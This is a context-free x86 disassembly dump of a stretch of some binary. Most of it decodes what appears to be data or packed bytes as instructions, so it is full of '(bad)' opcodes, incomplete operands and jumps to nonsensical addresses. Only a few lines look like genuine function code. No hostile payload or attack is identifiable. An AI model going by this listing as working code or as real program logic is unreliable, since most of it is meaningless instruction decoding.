  40de7f:	add    BYTE PTR [edx-0x6314e108],al
  40de85:	pop    ecx
  40de86:	xchg   esi,eax
  40de87:	jle    0x40df07
  40de89:	and    bh,BYTE PTR [edi+0x7e]
  40de8c:	jle    0x40df09
  40de8e:	retf   0xd4e
  40de91:	or     eax,0xdcf8fef6
  40de96:	fsubr  st(2),st
  40de98:	add    DWORD PTR [ecx-0x29141232],esi
  40de9e:	add    DWORD PTR [edx-0x136e9d76],ebx
  40dea4:	test   DWORD PTR [edx+edx*8-0xccd9508],ebp
  40deab:	scas   al,BYTE PTR es:[edi]
  40deac:	xchg   ebx,eax
  40dead:	mov    ah,0x58
  40deaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40deb0:	add    bh,BYTE PTR [edx+0x5b]
  40deb3:	push   0xffffff80
  40deb5:	std    
  40deb6:	shl    dl,cl
  40deb8:	pop    esp
  40deb9:	mov    ds:0xd8640177,eax
  40debe:	in     al,0xd0
  40dec0:	add    bl,cl
  40dec2:	inc    ebx
  40dec3:	jb     0x40df1c
  40dec5:	mov    BYTE PTR [eax],al
  40dec7:	dec    ebx
  40dec8:	xchg   ebx,eax
  40dec9:	mov    dl,bh
  40decb:	mov    WORD PTR [ecx],?
  40decd:	ror    DWORD PTR [edx+edx*4+0x4123d880],1
  40ded4:	sahf   
  40ded5:	pop    ecx
  40ded6:	inc    esp
  40ded7:	fbld   TBYTE PTR [esi]
  40ded9:	fs jp  0x40decb
  40dedc:	out    0xc0,eax
  40dede:	push   esp
  40dedf:	int3   
  40dee0:	pop    esi
  40dee1:	loop   0x40decb
  40dee3:	add    dl,dh
  40dee5:	dec    ebp
  40dee6:	push   esi
  40dee7:	cmp    dl,BYTE PTR [ebx+0x4db4dcd5]
  40deed:	clc    
  40deee:	sub    esi,ebx
  40def0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40def1:	and    BYTE PTR fs:[eax],bh
  40def4:	cmp    esi,esi
  40def6:	jecxz  0x40df39
  40def8:	jae    0x40df13
  40defa:	ja     0x40df44
  40defc:	sub    edi,DWORD PTR [esi]
  40defe:	lods   al,BYTE PTR ds:[esi]
  40deff:	xchg   ebp,eax
  40df00:	sub    cl,BYTE PTR [edi-0x5e]
  40df03:	xor    BYTE PTR [ebx],0xea
  40df06:	push   eax
  40df07:	fdiv   st,st(0)
  40df09:	test   eax,0x273f8e53
  40df0e:	std    
  40df0f:	popf   
  40df10:	push   esp
  40df11:	(bad)  
  40df12:	or     DWORD PTR [esi],ebp
  40df14:	js     0x40df7c
  40df16:	jp     0x40df7c
  40df18:	inc    esi
  40df19:	mov    ebx,0xe817a388
  40df1e:	inc    edi
  40df1f:	inc    ecx
  40df20:	(bad)  
  40df21:	xchg   edi,eax
  40df22:	jnp    0x40dee0
  40df24:	ss js  0x40dfa5
  40df27:	fadd   DWORD PTR [ebx+0x1c8eda17]
  40df2d:	stos   BYTE PTR es:[edi],al
  40df2e:	pop    eax
  40df2f:	sub    al,0x64
  40df31:	jmp    0x59c3:0xc36ef807
  40df38:	jno    0x40df22
  40df3a:	add    dh,BYTE PTR [edi*1+0x1f0dd477]
  40df41:	xor    DWORD PTR [edx+esi*1+0x6],esi
  40df45:	lea    edx,[eax-0x5c583ecb]
  40df4b:	sub    eax,0x11a24f3e
  40df50:	cmp    eax,0xb4314450
  40df55:	cdq    
  40df56:	pop    es
  40df57:	and    al,0x81
  40df59:	stos   DWORD PTR es:[edi],eax
  40df5a:	push   0x944b913b
  40df5f:	shl    BYTE PTR [edx-0x6b898361],cl
  40df65:	or     al,0xe5
  40df67:	in     al,dx
  40df68:	adc    dh,BYTE PTR [eax-0x4227be4]
  40df6e:	mov    ecx,0xc1699c86
  40df73:	push   0x48ada415
  40df78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df79:	ret    
  40df7a:	mov    ebp,0xcd4b2b1e
  40df7f:	dec    ecx
  40df80:	cdq    
  40df81:	lahf   
  40df82:	(bad)  
  40df84:	mov    ds:0x35339785,eax
  40df89:	jmp    0x697:0x8db8de07
  40df90:	sbb    BYTE PTR [esi-0x6352db54],ah
  40df96:	mov    bl,0xc6
  40df98:	or     cl,BYTE PTR [eax+0x641eaba4]
  40df9e:	lea    esp,[edx-0x57]
  40dfa1:	xchg   edi,eax
  40dfa2:	iret   
  40dfa3:	test   al,0xb3
  40dfa5:	push   esp
  40dfa6:	stos   DWORD PTR es:[edi],eax
  40dfa7:	(bad)  
  40dfa8:	mov    edi,0xb0a60cc7
  40dfad:	push   es
  40dfae:	push   ebx
  40dfaf:	test   DWORD PTR [esi],esi
  40dfb1:	rcr    DWORD PTR [edi-0xab659de],0xd7
  40dfb8:	mov    ch,0x43
  40dfba:	xchg   ebx,ecx
  40dfbc:	sub    ebx,ecx
  40dfbe:	xchg   ebx,ecx
  40dfc0:	dec    ecx
  40dfc1:	mov    eax,DWORD PTR [ebp-0x1c]
  40dfc4:	imul   eax,ecx
  40dfc7:	add    esp,eax
  40dfc9:	xchg   edx,eax
  40dfca:	push   eax
  40dfcb:	xor    ebx,ebx
  40dfcd:	mov    edx,esp
  40dfcf:	dec    edx
  40dfd0:	inc    ebx
  40dfd1:	add    ebx,DWORD PTR [edx+ebx*1]
  40dfd4:	dec    ebx
  40dfd5:	xor    edx,edx
  40dfd7:	add    DWORD PTR [ebp-0xc],ebx
  40dfda:	pop    ebx
  40dfdb:	mov    eax,DWORD PTR [ebp-0xc]
  40dfde:	pop    edi
  40dfdf:	pop    esi
  40dfe0:	pop    ebx
  40dfe1:	leave  
  40dfe2:	ret    0x10
  40dfe5:	dec    ebp
  40dfe6:	push   ebp
  40dfe7:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  40dfed:	mov    esp,ebp
  40dfef:	or     ah,dh
  40dff1:	dec    ebp
  40dff2:	add    bh,al
  40dff4:	add    BYTE PTR [eax],cl
  40dff6:	add    BYTE PTR [eax],al
  40dff8:	mov    DWORD PTR [eax],0x40f44545
  40dffe:	xor    DWORD PTR [eax],eax
  40e000:	test   DWORD PTR [ebx-0x34070b64],ecx
  40e006:	(bad)  
  40e007:	enter  0x4d45,0xbc
  40e00b:	mov    esi,DWORD PTR [edx]
  40e00d:	hlt    
  40e00e:	test   ebx,ecx
  40e010:	pushf  
  40e011:	enter  0x4df8,0x8b
  40e015:	mov    DWORD PTR [ebp-0x20],0x890208
  40e01c:	inc    ebp
  40e01d:	inc    ebp
  40e01e:	cld    
  40e01f:	xor    cl,BYTE PTR [ebx-0xb38b300]
  40e025:	or     BYTE PTR [ebx+0x0],dl
  40e028:	mov    ebx,0x8bd5400
  40e02d:	call   DWORD PTR [ecx-0x1]
  40e030:	pop    es
  40e031:	mov    ch,0x33
  40e033:	dec    ebx
  40e035:	(bad)  
  40e036:	mov    eax,0x72009ba4
  40e03b:	push   DWORD PTR [edx]
  40e03d:	or     BYTE PTR [eax],al
  40e03f:	jmp    0xff89:0x75c84d03
  40e046:	dec    ebp
  40e047:	loopne 0x40e019
  40e049:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  40e04f:	add    BYTE PTR [ebx],dh
  40e051:	mov    ecx,ebx
  40e053:	hlt    
  40e054:	add    ecx,ebx
  40e056:	enter  0x899b,0x32
  40e05a:	dec    ebp
  40e05b:	add    ecx,eax
  40e05d:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  40e063:	or     DWORD PTR [ebx-0xb00b29c],0x0
  40e06a:	xor    ecx,ebx
  40e06c:	retf   
  40e06d:	enter  0x4d03,0xc8
  40e071:	mov    DWORD PTR fs:[eax],ebx
  40e074:	lea    eax,[eax]
  40e076:	push   esp
  40e077:	mov    edi,edi
  40e079:	fs (bad) 
  40e07b:	(bad)  
  40e07c:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  40e082:	push   0xffffffff
  40e084:	and    bh,bh
  40e086:	pop    ecx
  40e087:	inc    eax
  40e088:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  40e08e:	push   0xffffff8b
  40e090:	pop    ecx
  40e091:	cld    
  40e092:	dec    ebp
  40e093:	lea    ecx,[ecx+0x45ff08ff]
  40e099:	mov    BYTE PTR [edx+0x1],cl
  40e09c:	add    BYTE PTR [eax],al
  40e09e:	mov    DWORD PTR [ebp+0x8],0x58008d
  40e0a5:	dec    DWORD PTR [ebp-0x77]
  40e0a8:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  40e0af:	cld    
  40e0b0:	dec    ebp
  40e0b1:	jne    0x40e0e6
  40e0b3:	lea    eax,[ebx]
  40e0b5:	push   eax
  40e0b6:	mov    edi,edi
  40e0b8:	or     BYTE PTR [ecx+0x54a845],cl
  40e0be:	add    al,ch
  40e0c0:	(bad)  
  40e0c1:	sub    esp,ebp
  40e0c3:	add    BYTE PTR [eax],al
  40e0c5:	rol    BYTE PTR [eax],0x84
  40e0c8:	inc    ebp
  40e0c9:	add    dh,BYTE PTR [esi+0x0]
  40e0cc:	add    BYTE PTR [ebp-0x73],al
  40e0cf:	mov    ebp,DWORD PTR [esp+edx*4]
  40e0d2:	inc    DWORD PTR [eax]
  40e0d4:	lea    ecx,[ebx-0x30074f4]
  40e0da:	call   0x41ec5f
  40e0df:	add    BYTE PTR [ebp+0x0],cl
  40e0e2:	jne    0x40e125
  40e0e4:	dec    DWORD PTR [ebx-0x76210314]
  40e0ea:	dec    ebp
  40e0eb:	add    DWORD PTR [ebp+0x0],esi
  40e0ee:	(bad)  
  40e0ef:	xchg   ebp,eax
  40e0f0:	loopne 0x40e0f1
  40e0f2:	inc    eax
  40e0f3:	inc    DWORD PTR [eax]
  40e0f5:	mov    ecx,DWORD PTR [ebp-0x4]
  40e0f8:	xor    edx,DWORD PTR [edx+0x7201b8]
  40e0fe:	add    BYTE PTR [edx],dl
  40e100:	enter  0x4d90,0x0
  40e104:	mov    eax,DWORD PTR [eax]
  40e106:	hlt    
  40e107:	add    al,0xa5
  40e109:	mov    al,0xff
  40e10b:	add    bh,bh
  40e10d:	add    BYTE PTR [ebx],dh
  40e10f:	inc    DWORD PTR [ebx]
  40e111:	sbb    al,0x89
  40e113:	jne    0x40e0ed
  40e115:	mov    esp,DWORD PTR [ecx+0x4500fc]
  40e11b:	mov    eax,DWORD PTR [ebp-0xff0048]
  40e121:	mov    DWORD PTR [eax-0x70],0xec58ed89
  40e128:	inc    DWORD PTR [ebp-0x75]
  40e12b:	fisttp QWORD PTR [esi+ebp*8]
  40e12e:	test   DWORD PTR [esi-0x1],esp
  40e131:	inc    ebp
  40e132:	(bad)  
  40e133:	aas    
  40e134:	inc    ebp
  40e135:	(bad)  
  40e136:	lea    edi,[esp+eiz*2-0x1]
  40e13a:	inc    edi
  40e13c:	mov    DWORD PTR ds:0x8000c7a0,edi
  40e142:	mov    ebp,esp
  40e144:	cld    
  40e145:	loop   0x40e0d4
  40e147:	inc    ebp
  40e148:	(bad)  
  40e149:	out    dx,al
  40e14a:	(bad)  
  40e14b:	fisttp WORD PTR [eax+0x8801c7]
  40e151:	jecxz  0x40e198
  40e153:	in     al,dx
  40e154:	inc    DWORD PTR [ebp-0x4]
  40e157:	out    0x8d,eax
  40e159:	aas    
  40e15a:	inc    edi
  40e15c:	jmp    FWORD PTR [eax-0x78]
  40e15f:	inc    DWORD PTR [ecx]
  40e161:	mov    DWORD PTR [eax],0xc7a83d
  40e167:	ins    BYTE PTR es:[edi],dx
  40e168:	test   edi,edi
  40e16a:	pandn  mm0,mm5
  40e16d:	aas    
  40e16e:	add    bh,al
  40e170:	mov    esi,DWORD PTR [eax-0x4]
  40e173:	inc    DWORD PTR [eax+0xdf01ee]
  40e179:	(bad)  
  40e17a:	or     BYTE PTR [ebp+eax*2-0x1],dh
  40e17e:	mov    ebp,ebx
  40e180:	xchg   esp,eax
  40e181:	fild   DWORD PTR [eax]
  40e183:	(bad)  
  40e184:	mov    edi,DWORD PTR [eax+0x3]
  40e187:	(bad)  
  40e188:	cmp    al,0xe7
  40e18a:	dec    ebp
  40e18b:	leave  
  40e18c:	mov    ebp,eax
  40e18e:	fsubr  DWORD PTR [ecx]
  40e190:	add    BYTE PTR [eax],al
  40e192:	lea    ecx,[ebx-0x7f0003b4]
  40e198:	push   edx
  40e199:	add    DWORD PTR [ebp+0x0],edx
  40e19c:	mov    esi,DWORD PTR [eax]
  40e19e:	mov    WORD PTR [ebx-0x7a750000],?
  40e1a4:	add    esi,DWORD PTR [ebp-0x78]
  40e1a7:	mov    eax,DWORD PTR [eax]
  40e1a9:	cld    
  40e1aa:	push   0x7d
  40e1ac:	dec    DWORD PTR [ebx+0xd88c]
  40e1b2:	push   edx
  40e1b3:	mov    edx,DWORD PTR [ecx-0x4]
  40e1b6:	call   DWORD PTR [eax+0x7d01fc]
  40e1bc:	mov    ebx,edx
  40e1be:	cld    
  40e1bf:	add    BYTE PTR [eax+0x560150],dl
  40e1c5:	test   DWORD PTR [ebp+0x75],eax
  40e1c8:	loop   0x40e155
  40e1ca:	jmp    0xe38b:0x947dc7fc
  40e1d1:	fsub   st,st(7)
  40e1d3:	add    bh,al
  40e1d5:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  40e1db:	add    edi,edi
  40e1dd:	add    bh,bh
  40e1df:	mov    eax,0x50e600ed
  40e1e4:	inc    ebp
  40e1e5:	push   esi
  40e1e6:	fisttp WORD PTR [ebx+0x4dc7f43f]
  40e1ec:	test   BYTE PTR [ebx],dh
  40e1ee:	out    0x5,al
  40e1f0:	shl    BYTE PTR [edx+0x45],0x0
  40e1f4:	jmp    0x40e1b7
  40e1f6:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  40e1fd:	inc    esi
  40e1fe:	jle    0x40e200
  40e200:	test   edi,eax
  40e202:	jmp    esp
  40e204:	inc    DWORD PTR [eax]
  40e206:	in     eax,dx
  40e207:	add    dh,ah
  40e209:	jne    0x40e190
  40e20b:	mov    edi,edi
  40e20d:	cld    
  40e20e:	inc    DWORD PTR [ebp-0x14]
  40e211:	mov    esp,edx
  40e213:	mov    ah,0x85
  40e215:	add    bh,bh
  40e217:	call   0x1270b1b
  40e21c:	ror    BYTE PTR [ebx-0x7f00037b],0xff
  40e223:	add    ebx,esp
  40e225:	add    ah,ch
  40e227:	xor    BYTE PTR [ebp-0xff00cf],al
  40e22d:	mov    ebx,ebp
  40e22f:	cld    
  40e230:	jle    0x40e1bb
  40e232:	or     DWORD PTR [ecx],eax
  40e234:	add    BYTE PTR [eax],al
  40e236:	push   eax
  40e237:	add    DWORD PTR [ebp+0x45],eax
  40e23a:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  40e240:	dec    DWORD PTR [ebx-0x3fda0318]
  40e246:	add    BYTE PTR [ebp-0xbf0040],dl
  40e24c:	inc    ebp
  40e24d:	or     BYTE PTR [ebx-0x4faf0400],0x45
  40e254:	add    DWORD PTR [ebx+0x459c00],ecx
  40e25a:	mov    edi,edi
  40e25c:	mov    eax,0xe80800ff
  40e261:	inc    ebp
  40e262:	sub    BYTE PTR [ebx-0x47000400],cl
  40e268:	add    al,0x1
  40e26a:	rol    BYTE PTR [eax],0x1e
  40e26d:	jne    0x40e2b4
  40e26f:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  40e275:	inc    DWORD PTR [ecx]
  40e277:	call   0x860a7c
  40e27c:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  40e282:	call   0x410a88
  40e287:	xor    bh,bh
  40e289:	push   edi
  40e28a:	adc    BYTE PTR [ebx-0x747423bb],al
  40e290:	loopne 0x40e26e
  40e292:	ret    
  40e293:	loopne 0x40e230
  40e295:	xor    DWORD PTR [edx],0x31
  40e298:	cmp    edi,edi
  40e29a:	bswap  esp
  40e29c:	rol    BYTE PTR gs:[eax],0x5
  40e2a0:	jmp    0x12be3ea
  40e2a5:	mov    eax,DWORD PTR [ebp-0x4]
  40e2a8:	add    BYTE PTR [eax+0xff0100],bh
  40e2ae:	cld    
  40e2af:	jne    0x40e32e
  40e2b1:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  40e2b7:	push   ss
  40e2b8:	add    DWORD PTR [eax],eax
  40e2ba:	add    BYTE PTR [eax+0x7f],dl
  40e2bd:	inc    ebp
  40e2be:	add    BYTE PTR [ebx+0x459850],cl
  40e2c4:	mov    edi,edi
  40e2c6:	test   al,0xff
  40e2c8:	add    BYTE PTR [eax],cl
  40e2ca:	inc    DWORD PTR [ebp-0x18]
  40e2cd:	jmp    DWORD PTR ds:0x4d7d00dc
  40e2d3:	adc    BYTE PTR [ebx+0x459cb9],cl
  40e2d9:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  40e2df:	fwait
  40e2e0:	mov    eax,0x30132
  40e2e5:	lea    esi,[ebp+0x2c]
  40e2e8:	xor    edi,edi
  40e2ea:	(bad)  
  40e2eb:	call   0x1400a58
  40e2f0:	call   0x1350b80
  40e2f5:	jne    0x40e282
  40e2f7:	xor    edi,esp
  40e2f9:	add    eax,DWORD PTR [eax+0xc018d]
  40e2ff:	push   DWORD PTR [eax]
  40e301:	call   0xca0a5d
  40e306:	int3   
  40e307:	inc    DWORD PTR [ebp-0x14]
  40e30a:	mov    ecx,DWORD PTR [ebp-0x28]
  40e30d:	xor    eax,DWORD PTR [eax]
  40e30f:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  40e315:	(bad)  
  40e316:	xchg   ebp,eax
  40e317:	in     al,0xff
  40e319:	add    bh,bh
  40e31b:	add    BYTE PTR [ebp+0x45],dl
  40e31e:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  40e324:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff65]
  40e32b:	mov    edi,edi
  40e32d:	or     BYTE PTR [eax],cl
  40e32f:	inc    ebp
  40e330:	test   DWORD PTR gs:[eax],eax
  40e333:	je     0x40e37a
  40e335:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  40e33b:	xor    edx,DWORD PTR [eax-0x73]
  40e33e:	push   ebp
  40e33f:	or     BYTE PTR [ebp+0x21007572],al
  40e345:	inc    ebp
  40e346:	in     al,dx
  40e347:	mov    ebp,DWORD PTR [eax]
  40e349:	mov    esp,0x658bc345
  40e34e:	fmul   st,st(5)
  40e350:	add    BYTE PTR [ebx],ch
  40e352:	mov    eax,DWORD PTR [ebx]
  40e354:	cld    
  40e355:	loopne 0x40e317
  40e357:	inc    ebp
  40e358:	push   ebp
  40e359:	cmp    ebp,eax
  40e35b:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  40e362:	cld    
  40e363:	fadd   DWORD PTR [eax+0x3b014d]
  40e369:	jne    0x40e39b
  40e36b:	push   0xf8898557
  40e370:	in     al,dx
  40e371:	jne    0x40e3b8
  40e373:	lea    eax,[ebx+0x72e8dcc8]
  40e379:	das    
  40e37a:	mov    eax,DWORD PTR [eax]
  40e37c:	mov    esp,0x33eb7545
  40e381:	mov    edi,DWORD PTR [edi+0x4572bc]
  40e387:	xor    eax,edi
  40e389:	adc    DWORD PTR [ebp-0xcd0065],0x8be131
  40e393:	rcl    BYTE PTR [eax-0x40],1
  40e396:	inc    ebp
  40e397:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  40e39f:	inc    ebp
  40e3a0:	xchg   ebp,eax
  40e3a1:	ud0    ebp,DWORD PTR [ebx]
  40e3a4:	inc    DWORD PTR [eax]
  40e3a6:	retf   
  40e3a7:	jbe    0x40e3a9
  40e3a9:	mov    dl,BYTE PTR [eax-0x80]
  40e3ac:	push   ebp
  40e3ad:	pop    ds
  40e3ae:	mov    ecx,DWORD PTR [esp+esi*8]
  40e3b1:	inc    eax
  40e3b2:	retf   
  40e3b3:	inc    ebp
  40e3b4:	iret   
  40e3b5:	jb     0x40e37f
  40e3b7:	mov    eax,DWORD PTR [edi]
  40e3b9:	enter  0x4545,0x1
  40e3bd:	xor    DWORD PTR [eax],eax
  40e3bf:	pushf  
  40e3c0:	mov    ecx,DWORD PTR [ecx+0x324df0bc]
  40e3c6:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  40e3cd:	dec    ebp
  40e3ce:	add    BYTE PTR [ebx],dh
  40e3d0:	inc    ebp
  40e3d1:	mov    DWORD PTR [ebx-0x3f641b4c],ecx
  40e3d7:	xor    dl,BYTE PTR [edx]
  40e3d9:	add    eax,DWORD PTR [ebp-0x77]
  40e3dc:	mov    eax,esp
  40e3de:	fmul   DWORD PTR [ebp-0x3d]
  40e3e1:	xor    eax,DWORD PTR [ebx+eax*1+0x832899b]
  40e3e8:	mov    DWORD PTR [ebp-0x28],eax
  40e3eb:	rol    DWORD PTR [ebp-0x64],1
  40e3ee:	xor    eax,edi
  40e3f0:	mov    ecx,0xff858db0
  40e3f5:	clc    
  40e3f6:	enter  0x4d45,0x3c
  40e3fa:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  40e401:	test   esi,edi
  40e403:	clc    
  40e404:	inc    DWORD PTR [ebp+0x45]
  40e407:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  40e40f:	test   DWORD PTR [ecx],esi
  40e411:	clc    
  40e412:	pushf  
  40e413:	inc    ebp
  40e414:	(bad)  
  40e415:	cmp    ah,bh
  40e417:	pushf  
  40e418:	inc    ebp
  40e419:	mov    edx,DWORD PTR [eax-0x28]
  40e41c:	lock push ebp
  40e41e:	add    BYTE PTR [ebx],dh
  40e420:	mov    DWORD PTR [ebx],eax
  40e422:	sar    BYTE PTR [ebx],1
  40e424:	adc    BYTE PTR [edi],cl
  40e426:	dec    ebp
  40e427:	adc    al,0x8b
  40e429:	add    al,dl
  40e42b:	jmp    0x101e5fb
  40e430:	jb     0x40e47f
  40e432:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  40e438:	xor    ecx,DWORD PTR [ebp+0x3b]
  40e43b:	xor    ecx,DWORD PTR [edi]
  40e43d:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  40e441:	(bad)  
  40e443:	clc    
  40e444:	enter  0x8400,0x8b
  40e448:	pop    es
  40e449:	mov    al,0x0
  40e44b:	push   ebp
  40e44c:	push   cs
  40e44d:	xor    ecx,eax
  40e44f:	xor    esp,ecx
  40e451:	add    ebp,DWORD PTR [eax]
  40e453:	add    esi,DWORD PTR [eax]
  40e455:	(bad)  
  40e457:	retf   0x55c8
  40e45a:	repnz mov eax,DWORD PTR [ebp-0x10]
  40e45e:	(bad)  
  40e45f:	cli    
  40e460:	fdivr  st,st(1)
  40e462:	test   DWORD PTR [eax+edi*8],ecx
  40e465:	dec    ebp
  40e466:	inc    ebp
  40e467:	xor    edi,DWORD PTR [eax-0x7167afd]
  40e46d:	add    BYTE PTR [ebp+0x0],al
  40e470:	mov    ecx,DWORD PTR [ebp-0x28]
  40e473:	mov    ecx,ebx
  40e475:	clc    
  40e476:	jne    0x40e443
  40e478:	mov    esi,0xd672d3
  40e47d:	into   
  40e47e:	into   
  40e47f:	scas   eax,DWORD PTR es:[edi]
  40e480:	dec    ebp
  40e481:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  40e487:	sub    ecx,esi
  40e489:	cmp    ecx,DWORD PTR [ebp+0x77]
  40e48c:	(bad)  
  40e48d:	mov    edi,eax
  40e48f:	mov    al,0x85
  40e491:	mov    eax,edi
  40e493:	add    BYTE PTR [ebp-0x75],al
  40e496:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  40e49d:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40e4a3:	(bad)  
  40e4a5:	retf   0x559c
  40e4a8:	(bad)  
  40e4a9:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  40e4b0:	inc    ebp
  40e4b1:	add    eax,0xeb9c4d3f
  40e4b6:	(bad)  
  40e4b7:	mov    ecx,esp
  40e4b9:	lods   al,BYTE PTR ds:[esi]
  40e4ba:	test   DWORD PTR [ebp-0x8],edx
  40e4bd:	xor    ecx,DWORD PTR [ebp+0x33]
  40e4c0:	mov    eax,DWORD PTR [ebx]
  40e4c2:	lock add ecx,ebx
  40e4c5:	bswap  esi
  40e4c7:	retf   0x55d1
  40e4ca:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  40e4d0:	jmp    0x40e4cb
  40e4d2:	add    BYTE PTR ds:0xebc44d8b,al
  40e4d8:	push   ebp
  40e4d9:	mov    ebp,DWORD PTR [ebx]
  40e4db:	test   al,0x8b
  40e4dd:	push   ebp
  40e4de:	clc    
  40e4df:	xor    ecx,ebx
  40e4e1:	xor    ecx,esi
  40e4e3:	add    edx,ecx
  40e4e5:	add    eax,DWORD PTR [edx+0xca010f]
  40e4eb:	push   ebp
  40e4ec:	dec    ebp
  40e4ed:	mov    ecx,DWORD PTR [ebx-0x34050710]
  40e4f3:	stc    
  40e4f4:	rol    DWORD PTR ds:0xebce4dd6,cl
  40e4fa:	scas   eax,DWORD PTR es:[edi]
  40e4fb:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  40e501:	xor    ebp,DWORD PTR [ebx]
  40e503:	xor    edi,DWORD PTR [ebx]
  40e505:	add    esi,DWORD PTR [edi+0x3]
  40e508:	mov    ecx,DWORD PTR [edi]
  40e50a:	clc    
  40e50b:	retf   0x55cb
  40e50e:	into   
  40e50f:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  40e516:	mov    eax,0x3376554d
  40e51b:	mov    esi,DWORD PTR [ebx]
  40e51d:	int3   
  40e51e:	add    edx,DWORD PTR [ebp+0x3]
  40e521:	xor    ecx,DWORD PTR [edi]
  40e523:	xor    ecx,edx
  40e525:	add    edx,DWORD PTR [ebp+0x3]
  40e528:	mov    ecx,DWORD PTR [edi]
  40e52a:	lock retf 0x4dfa
  40e52e:	stc    
  40e52f:	mov    ecx,DWORD PTR [eax]
  40e531:	or     BYTE PTR [ebp+0x4d],cl
  40e534:	jmp    0x104e5c4
  40e539:	dec    ebp
  40e53a:	dec    ebp
  40e53b:	(bad)  
  40e53c:	mov    ebx,esp
  40e53e:	clc    
  40e53f:	test   ebx,ecx
  40e541:	clc    
  40e542:	ror    DWORD PTR [ebp-0x2a],cl
  40e545:	mov    esi,ecx
  40e547:	call   0x33cc2afb
  40e54c:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  40e553:	retf   
  40e554:	ja     0x40e524
  40e556:	mov    ebp,DWORD PTR [eax-0x48]
  40e559:	dec    ebp
  40e55a:	xor    ecx,DWORD PTR [di+0x3]
  40e55e:	mov    esp,esp
  40e560:	clc    
  40e561:	push   ebp
  40e562:	retf   
  40e563:	mov    dl,bl
  40e565:	adc    esi,edx
  40e567:	jb     0x40e537
  40e569:	add    BYTE PTR [edi-0x3b7474b3],ch
  40e56f:	call   0x4d6cb0f1
  40e574:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  40e57a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e57b:	fwait
  40e57c:	inc    ebp
  40e57d:	xor    cl,BYTE PTR [ebp-0x78]
  40e580:	mov    edx,edi
  40e582:	clc    
  40e583:	dec    ebp
  40e584:	retf   
  40e585:	mov    edx,ebx
  40e587:	call   0x560fb962
  40e58c:	scas   eax,DWORD PTR es:[edi]
  40e58d:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  40e593:	fwait
  40e594:	sub    esi,DWORD PTR [edx]
  40e596:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40e59c:	lods   al,BYTE PTR ds:[esi]
  40e59d:	xor    esp,DWORD PTR [ebx]
  40e59f:	add    ecx,DWORD PTR [ebp-0x1c]
  40e5a2:	mov    edi,DWORD PTR [ebp-0x8]
  40e5a5:	mov    bl,cl
  40e5a7:	cmp    dl,bl
  40e5a9:	jb     0x40e579
  40e5ab:	add    dh,dl
  40e5ad:	dec    ebp
  40e5ae:	scas   eax,DWORD PTR es:[edi]
  40e5af:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  40e5b5:	shr    DWORD PTR [ebx],cl
  40e5b7:	into   
  40e5b8:	cmp    edx,esi
  40e5ba:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  40e5c0:	dec    ebp
  40e5c1:	dec    ebp
  40e5c2:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  40e5c8:	retf   
  40e5c9:	xor    edx,esi
  40e5cb:	add    ecx,esi
  40e5cd:	imul   ecx,edx
  40e5d0:	mov    DWORD PTR [ebp+0x8],edx
  40e5d3:	xor    ecx,DWORD PTR [ebp+0x2b]
  40e5d6:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  40e5dc:	add    esi,DWORD PTR [ebx]
  40e5de:	mov    ah,0x3
  40e5e0:	inc    ebp
  40e5e1:	rdtsc  
  40e5e3:	xlat   BYTE PTR ds:[ebx]
  40e5e4:	pushf  
  40e5e5:	jge    0x40e570
  40e5e7:	xor    ebx,eax
  40e5e9:	sub    eax,DWORD PTR [ebp-0x73]
  40e5ec:	(bad)  
  40e5ed:	cmp    al,al
  40e5ef:	jb     0x40e576
  40e5f1:	add    al,bh
  40e5f3:	ror    DWORD PTR [ebp-0x7a],1
  40e5f6:	xor    edi,edi
  40e5f8:	add    edi,edi
  40e5fa:	jmp    0x40e649
  40e5fc:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40e602:	dec    ebp
  40e603:	into   
  40e604:	mov    ebp,DWORD PTR [edi-0x23737428]
  40e60a:	fwait
  40e60b:	shl    DWORD PTR [edx],cl
  40e60d:	retf   0x5588
  40e610:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40e616:	add    eax,DWORD PTR [eax]
  40e618:	in     al,0x4d
  40e61a:	push   ebp
  40e61b:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  40e621:	gs add ch,cl
